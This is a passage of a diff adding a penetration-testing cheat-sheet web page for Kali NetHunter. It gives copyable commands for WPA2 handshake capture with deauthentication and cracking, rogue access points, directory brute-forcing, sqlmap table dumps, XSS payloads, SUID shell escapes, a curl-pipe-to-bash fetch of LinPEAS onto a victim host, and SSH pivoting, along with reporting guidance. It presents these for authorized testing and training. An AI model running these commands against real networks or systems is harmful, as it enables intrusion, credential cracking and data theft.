+<span class="prompt">kali# </span>hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a \
+        --increment  <span class="comment"># Brute all combos up to 6 chars</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= WIRELESS ======= -->
+<section class="section" id="wireless">
+
+  <div class="warn-box">⚠ Wireless attacks require a compatible adapter (Alfa AWUS036ACH recommended for OTG). Only test on networks you own or have permission to test.</div>
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Aircrack-ng Suite — WPA2 Handshake Capture</span>
+      <span class="badge badge-danger">WIRELESS</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+
+      <h3>Step 1 — Enable Monitor Mode</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>iwconfig          <span class="comment"># Find interface (wlan0, wlan1)</span>
+<span class="prompt">kali# </span>airmon-ng check kill    <span class="comment"># Kill interfering processes</span>
+<span class="prompt">kali# </span>airmon-ng start wlan0   <span class="comment"># Creates wlan0mon</span>
+<span class="prompt">kali# </span>iwconfig wlan0mon       <span class="comment"># Verify monitor mode</span></pre>
+      </div>
+
+      <h3>Step 2 — Scan for Networks</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>airodump-ng wlan0mon
+<span class="comment"># Note target BSSID (MAC) and CH (channel)</span></pre>
+      </div>
+
+      <h3>Step 3 — Capture Handshake</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Lock to target AP</span>
+<span class="prompt">kali# </span>airodump-ng --bssid AA:BB:CC:DD:EE:FF \
+              --channel 6 \
+              --write capture \
+              wlan0mon
+
+<span class="comment"># In another terminal — deauth a client to force reconnect</span>
+<span class="prompt">kali# </span>aireplay-ng --deauth 5 \
+              -a AA:BB:CC:DD:EE:FF \
+              wlan0mon
+<span class="comment"># Watch for [ WPA handshake: AA:BB:CC:DD:EE:FF ]</span></pre>
+      </div>
+
+      <h3>Step 4 — Crack the Handshake</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>aircrack-ng capture-01.cap \
+        -w /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># Or use hashcat (faster with GPU)</span>
+<span class="prompt">kali# </span>hcxpcapngtool capture-01.cap -o hash.hc22000
+<span class="prompt">kali# </span>hashcat -m 22000 hash.hc22000 rockyou.txt</pre>
+      </div>
+
+      <h3>Restore Normal Mode</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>airmon-ng stop wlan0mon
+<span class="prompt">kali# </span>service NetworkManager start</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">Evil Twin / Rogue AP — Social Engineering</span>
+      <span class="badge badge-danger">WIRELESS</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="info-box">This is used to test if employees connect to rogue networks — only in authorized engagements.</div>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">kali# </span>apt install -y hostapd-wpe dnsmasq
+<span class="comment"># Use hostapd-wpe or airbase-ng for rogue AP</span>
+<span class="comment"># Or use the NetHunter BadAP app for one-click setup</span>
+
+<span class="comment"># NetHunter has built-in Evil AP Wizard in the app</span>
+<span class="comment"># NetHunter App → BadAP → Configure → Start</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= WEB APPS ======= -->
+<section class="section" id="web">
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Web Directory & File Enumeration</span>
+      <span class="badge badge-warn">ACTIVE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Gobuster — fast directory brute force</span>
+<span class="prompt">kali# </span>gobuster dir -u http://192.168.1.100 \
+        -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+        -x php,html,txt,bak \
+        -t 50 -o gobuster.txt
+
+<span class="comment"># FFUF — fuzzing framework</span>
+<span class="prompt">kali# </span>apt install -y ffuf
+<span class="prompt">kali# </span>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+        -u http://192.168.1.100/FUZZ \
+        -mc 200,301,302 -o ffuf.json
+
+<span class="comment"># Dirsearch</span>
+<span class="prompt">kali# </span>python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py \
+        -u http://192.168.1.100 -e php,html,js</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">SQL Injection — SQLMap</span>
+      <span class="badge badge-danger">EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Basic SQLi test on GET parameter</span>
+<span class="prompt">kali# </span>sqlmap -u "http://192.168.1.100/page.php?id=1" \
+        --dbs                <span class="comment"># Enumerate databases</span>
+
+<span class="prompt">kali# </span>sqlmap -u "http://target/page.php?id=1" \
+        -D mydb --tables     <span class="comment"># List tables</span>
+
+<span class="prompt">kali# </span>sqlmap -u "http://target/page.php?id=1" \
+        -D mydb -T users --dump   <span class="comment"># Dump table</span>
+
+<span class="comment"># POST request SQLi (use Burp to capture request)</span>
+<span class="prompt">kali# </span>sqlmap -r request.txt \
+        --level=5 --risk=3 --dbs</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">03</span>
+      <span class="module-title">Burp Suite — HTTP Interception Proxy</span>
+      <span class="badge badge-info">PROXY</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Launch Burp Suite Community</span>
+<span class="prompt">kali# </span>burpsuite &
+
+<span class="comment"># Configure proxy listener: 127.0.0.1:8080
+# Set Android browser proxy:
+#   Settings → Wi-Fi → Proxy → Manual
+#   Host: 127.0.0.1, Port: 8080
+# Install Burp CA certificate for HTTPS interception</span>
+
+<span class="comment"># For Termux CLI intercept with mitmproxy</span>
+<span class="prompt">kali# </span>apt install -y mitmproxy
+<span class="prompt">kali# </span>mitmproxy --listen-port 8080
+<span class="comment"># Navigate target app traffic through proxy</span></pre>
+      </div>
+
+      <h3>Key Burp Modules</h3>
+      <table>
+        <tr><th>Module</th><th>Use Case</th></tr>
+        <tr><td>Proxy → Intercept</td><td>Catch & modify HTTP requests live</td></tr>
+        <tr><td>Repeater</td><td>Manually replay & tweak requests</td></tr>
+        <tr><td>Intruder</td><td>Automated fuzzing / brute force</td></tr>
+        <tr><td>Scanner (Pro)</td><td>Automated web vuln scan</td></tr>
+        <tr><td>Decoder</td><td>Encode/decode Base64, URL, etc.</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">04</span>
+      <span class="module-title">XSS & Manual Web Testing</span>
+      <span class="badge badge-danger">EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Basic XSS payloads to test in input fields</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+'"&gt;&lt;svg onload=alert(1)&gt;
+javascript:alert(1)
+
+<span class="comment"># DVWA (Damn Vulnerable Web App) setup</span>
+<span class="prompt">kali# </span>apt install -y dvwa
+<span class="prompt">kali# </span>service apache2 start
+<span class="prompt">kali# </span>service mysql start
+<span class="comment"># Access DVWA at http://127.0.0.1/dvwa</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= POST EXPLOIT ======= -->
+<section class="section" id="post">
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Privilege Escalation — Linux</span>
+      <span class="badge badge-danger">POST-EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Manual enumeration</span>
+<span class="prompt">$ </span>id && whoami && uname -a
+<span class="prompt">$ </span>sudo -l          <span class="comment"># What can we run as root?</span>
+<span class="prompt">$ </span>find / -perm -4000 2>/dev/null   <span class="comment"># SUID binaries</span>
+<span class="prompt">$ </span>cat /etc/crontab  <span class="comment"># Cron jobs</span>
+<span class="prompt">$ </span>ps aux            <span class="comment"># Running processes</span>
+<span class="prompt">$ </span>env               <span class="comment"># Environment variables</span>
+
+<span class="comment"># LinPEAS — automated Linux privesc checker</span>
+<span class="prompt">kali# </span>wget https://github.com/carlospolop/PEASS-ng/\
+releases/latest/download/linpeas.sh
+<span class="prompt">kali# </span>python3 -m http.server 8000   <span class="comment"># Serve to target</span>
+
+<span class="prompt">victim$ </span>curl http://YOURIP:8000/linpeas.sh | bash</pre>
+      </div>
+
+      <h3>Common Privesc via SUID</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># GTFOBins cheat — check gtfobins.github.io</span>
+<span class="comment"># Example: if /bin/find has SUID:</span>
+<span class="prompt">$ </span>find . -exec /bin/sh \; -quit
+
+<span class="comment"># If vim has SUID:</span>
+<span class="prompt">$ </span>vim -c ':!id'
+<span class="prompt">$ </span>vim -c ':!/bin/sh'</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="module">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">02</span>
+      <span class="module-title">Pivoting & Tunneling</span>
+      <span class="badge badge-danger">POST-EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># SSH tunneling — forward remote port to local</span>
+<span class="prompt">kali# </span>ssh -L 3306:192.168.2.10:3306 user@192.168.1.100
+<span class="comment"># Now: mysql -h 127.0.0.1 -P 3306 accesses internal DB</span>
+
+<span class="comment"># SSH dynamic SOCKS proxy</span>
+<span class="prompt">kali# </span>ssh -D 1080 user@192.168.1.100
+<span class="prompt">kali# </span>proxychains nmap -sT 192.168.2.0/24
+
+<span class="comment"># Metasploit route / autoroute</span>
+<span class="prompt">msf6 > </span>use post/multi/manage/autoroute
+<span class="prompt">msf6 > </span>set SESSION 1
+<span class="prompt">msf6 > </span>run</pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= REPORTING ======= -->
+<section class="section" id="report">
+
+  <div class="module open">
+    <div class="module-header" onclick="toggleModule(this)">
+      <span class="module-num">01</span>
+      <span class="module-title">Pentest Report Structure</span>
+      <span class="badge badge-info">DELIVERABLE</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="module-body">
+      <p>A professional pentest report must be clear, reproducible, and risk-rated. Below is the standard structure:</p>
+
+      <ol class="steps">
+        <li><strong>Executive Summary</strong> — High-level findings for management. No jargon. Focus on business risk.</li>
+        <li><strong>Scope & Rules of Engagement</strong> — IPs tested, dates, methods permitted, out-of-scope items.</li>
+        <li><strong>Methodology</strong> — Phases: Recon → Scanning → Exploitation → Post-exploitation → Cleanup.</li>
+        <li><strong>Findings</strong> — Each vulnerability with: CVE, severity (CVSS score), proof (screenshot/command output), and reproduction steps.</li>
+        <li><strong>Risk Ratings</strong> — Critical / High / Medium / Low / Informational using CVSS 3.1.</li>
+        <li><strong>Remediation Recommendations</strong> — Specific, actionable fixes for each finding.</li>
+        <li><strong>Appendices</strong> — Raw tool output, network diagrams, raw command logs.</li>
+      </ol>
+
+      <h3>CVSS Severity Scale</h3>
+      <table>
+        <tr><th>Score</th><th>Severity</th><th>Color</th></tr>
+        <tr><td>9.0–10.0</td><td>Critical</td><td style="color:#ff3131">■ Critical</td></tr>
+        <tr><td>7.0–8.9</td><td>High</td><td style="color:#ff7a00">■ High</td></tr>
+        <tr><td>4.0–6.9</td><td>Medium</td><td style="color:#ffb300">■ Medium</td></tr>
+        <tr><td>0.1–3.9</td><td>Low</td><td style="color:#00e5ff">■ Low</td></tr>
+        <tr><td>0.0</td><td>Informational</td><td style="color:#4caf6a">■ Info</td></tr>
+      </table>
+
+      <h3>Auto-generate Report with Metasploit</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="prompt">msf6 > </span>db_export -f xml /tmp/pentest_report.xml
+<span class="comment"># Or use Dradis / Serpico for report generation</span>
+<span class="prompt">kali# </span>apt install -y dradis
+<span class="prompt">kali# </span>dradis &   <span class="comment"># Access at http://localhost:3000</span></pre>
+      </div>
+
+      <h3>Evidence Collection Commands</h3>
+      <div class="term">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre><span class="comment"># Log all terminal output to file</span>
+<span class="prompt">kali# </span>script ~/pentest_$(date +%Y%m%d).log
+
+<span class="comment"># Screenshot from command line</span>
+<span class="prompt">kali# </span>scrot ~/evidence/$(date +%H%M%S).png
+
+<span class="comment"># Save nmap results in all formats</span>
+<span class="prompt">kali# </span>nmap -sC -sV $TARGET -oA ~/results/target
+<span class="comment"># Creates: target.nmap, target.xml, target.gnmap</span></pre>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- ======= CHECKLIST ======= -->
+<section class="section" id="checklist">
+
+  <h3 style="margin-bottom:14px;">Pentest Progress Tracker</h3>
+  <p style="color:var(--text-dim);font-size:12px;margin-bottom:16px;">Tap items to mark complete. Progress saved locally.</p>
+
+  <div class="tracker" id="tracker"></div>
+
+</section>
+
+</div><!-- /container -->
+
+<script>
+// Tab navigation
+function showTab(id) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  event.target.classList.add('active');
+}
+
+// Collapsible modules
+function toggleModule(header) {
+  header.parentElement.classList.toggle('open');
+}
+
+// Copy code
+function copyCode(btn) {
+  const pre = btn.nextElementSibling;
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'COPIED';
+    setTimeout(() => btn.textContent = 'COPY', 1500);
+  });
+}
+
+// Checklist
+const tasks = [
+  { phase: 'PRE-ENGAGEMENT', items: [
+    'Obtain written authorization / Rules of Engagement',
+    'Define scope (IPs, domains, excluded systems)',
+    'Set up logging (script command)',
+    'Verify NetHunter & Termux tools are updated',
+    'Connect to lab / VPN (TryHackMe, VulnHub, etc.)'
+  ]},
+  { phase: 'RECONNAISSANCE', items: [
+    'WHOIS & DNS lookup on target',
+    'Subdomain enumeration (amass/subfinder)',
+    'Google dork search',
+    'theHarvester OSINT scan',
+    'Host discovery (netdiscover / arp-scan)',
+    'OS fingerprinting (nmap -O)'
+  ]},
+  { phase: 'SCANNING', items: [
+    'Full TCP port scan (nmap -p-)',
+    'Service version detection (-sV)',
+    'NSE vuln script scan (--script vuln)',
+    'UDP scan on key ports (-sU)',
+    'Web server scan (nikto)',
+    'Directory enumeration (gobuster/ffuf)'
+  ]},
+  { phase: 'EXPLOITATION', items: [
+    'Search ExploitDB / Metasploit for vulns',
+    'Attempt exploitation with Metasploit',
+    'Test default credentials (hydra)',
+    'SQL injection testing (sqlmap)',
+    'XSS testing on web inputs',
+    'Capture screenshots/evidence of access'
+  ]},
+  { phase: 'POST-EXPLOITATION', items: [
+    'Enumerate local users and groups',
+    'Check sudo permissions',
+    'Run LinPEAS/WinPEAS for privesc paths',
+    'Attempt privilege escalation',
+    'Check for sensitive data/files',
+    'Document lateral movement paths'
+  ]},
+  { phase: 'REPORTING', items: [
+    'Export all logs and tool output',
+    'Rate each finding with CVSS score',
+    'Write reproduction steps for each vuln',
+    'Draft remediation recommendations',
+    'Compile executive summary',
+    'Deliver report to stakeholder'
+  ]}
+];
+
+const trackerEl = document.getElementById('tracker');
+const state = JSON.parse(localStorage.getItem('nhlab_checks') || '{}');
+
+tasks.forEach(phase => {
+  const phaseEl = document.createElement('div');
+  phaseEl.style.marginBottom = '20px';
+  phaseEl.innerHTML = `<h3 style="margin-bottom:8px;">${phase.phase}</h3>`;
+
+  phase.items.forEach(item => {
+    const key = phase.phase + '::' + item;
+    const isChecked = state[key];
+
+    const row = document.createElement('div');
+    row.className = 'track-item';
+    row.innerHTML = `
+      <div class="checkbox ${isChecked ? 'checked' : ''}">${isChecked ? '✓' : ''}</div>
+      <span class="track-label ${isChecked ? 'checked' : ''}">${item}</span>
+    `;
+    row.addEventListener('click', () => {
+      const cb = row.querySelector('.checkbox');
+      const lbl = row.querySelector('.track-label');
+      const nowChecked = !cb.classList.contains('checked');
+      cb.classList.toggle('checked', nowChecked);
+      cb.textContent = nowChecked ? '✓' : '';
+      lbl.classList.toggle('checked', nowChecked);
+      state[key] = nowChecked;
+      try { localStorage.setItem('nhlab_checks', JSON.stringify(state)); } catch(e) {}
+    });
+    phaseEl.appendChild(row);
+  });
+
+  trackerEl.appendChild(phaseEl);
+});
+</script>
+
+<script>
+if ("serviceWorker" in navigator) {
+  window.addEventListener("load", () => {
+    navigator.serviceWorker.register("./sw.js")
+      .then(r => console.log("SW registered:", r.scope))
+      .catch(e => console.log("SW error:", e));
+  });
+}
+</script>
+</body>
+</html>
